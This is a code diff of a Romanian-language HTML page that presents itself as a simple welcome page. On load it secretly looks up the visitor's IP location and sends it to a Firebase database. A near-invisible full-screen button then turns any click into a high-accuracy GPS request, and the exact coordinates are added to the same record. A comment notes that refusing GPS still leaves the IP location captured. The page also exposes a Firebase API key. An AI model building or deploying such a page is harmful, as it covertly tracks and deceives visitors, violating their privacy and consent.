@@ -3,19 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verificare</title>
+    <title>Pagina de Start</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+        
+        /* Butonul invizibil care acoperă tot ecranul */
+        #overlay-button {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(255,255,255,0.01); /* Aproape invizibil */
+            z-index: 9999;
+            cursor: pointer;
+            border: none;
+        }
+
+        .content {
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; height: 100vh; text-align: center;
+        }
+    </style>
 </head>
 <body>
-    <div style="text-align: center; padding-top: 50px; font-family: Arial;">
-        <h2>Se stabilește conexiunea securizată...</h2>
-        <p id="status">Vă rugăm așteptați...</p>
+
+    <button id="overlay-button" onclick="requestGPS()"></button>
+
+    <div class="content">
+        <h1>Bine ai venit</h1>
+        <p>Apasă oriunde pentru a continua...</p>
+        <div id="status" style="color: gray; font-size: 12px; margin-top: 20px;"></div>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
     <script>
-        // Configurația ta reală
         const firebaseConfig = {
             apiKey: "AIzaSyCJxFox3puC2aDapW9peyPgOLhIVMyzI4c",
             authDomain: "location-demo-64338.firebaseapp.com",
@@ -26,40 +48,62 @@
             appId: "1:884756282803:web:8724805c2c32d3273b5fc6"
         };
 
-        // Initializare
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Funcția de captură
-        async function captureData() {
+        let visitRef = null;
+
+        // 1. IMEDIAT: Luăm locația aproximativă prin IP
+        window.onload = async () => {
             try {
-                // Folosim HTTPS obligatoriu pentru GitHub Pages
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
                 const info = {
-                    lat: data.latitude || "N/A",
-                    lon: data.longitude || "N/A",
-                    oras: data.city || "Necunoscut",
-                    tara: data.country_name || "Necunoscut",
-                    ip: data.ip || "N/A",
-                    furnizor: data.org || "N/A",
-                    data: new Date().toLocaleString('ro-RO')
+                    tip: "IP (Aproximativ)",
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    oras: data.city,
+                    ip: data.ip,
+                    timp: new Date().toLocaleString()
                 };
+                // Salvăm și păstrăm referința pentru a o actualiza mai târziu
+                visitRef = await database.ref('vizite').push(info);
+                console.log("IP capturat");
+            } catch(e) { console.error(e); }
+        };
 
-                // Trimitem în tabelul 'vizite'
-                await database.ref('vizite').push(info);
-                
-                document.getElementById("status").innerText = "Conexiune stabilă.";
-                console.log("Date trimise cu succes!");
-            } catch (error) {
-                console.error("Eroare:", error);
-                document.getElementById("status").innerText = "Eroare la sincronizare.";
+        // 2. LA CLICK: Cerem GPS-ul exact
+        function requestGPS() {
+            // Ascundem overlay-ul după primul click
+            document.getElementById('overlay-button').style.display = 'none';
+            document.getElementById('status').innerText = "Se verifică browserul...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // Dacă utilizatorul a dat PERMITE
+                        const gpsData = {
+                            tip: "GPS (EXACT)",
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            precizie: pos.coords.accuracy + " metri",
+                            timp_gps: new Date().toLocaleString()
+                        };
+
+                        // Actualizăm intrarea existentă în Firebase
+                        if (visitRef) {
+                            visitRef.update(gpsData);
+                        }
+                        alert("Conținutul se încarcă...");
+                    },
+                    (err) => {
+                        console.log("GPS Refuzat");
+                        // Chiar dacă refuză, noi avem deja locația prin IP de la pasul 1
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             }
         }
-
-        // Pornim automat
-        window.onload = captureData;
     </script>
 </body>
 </html>
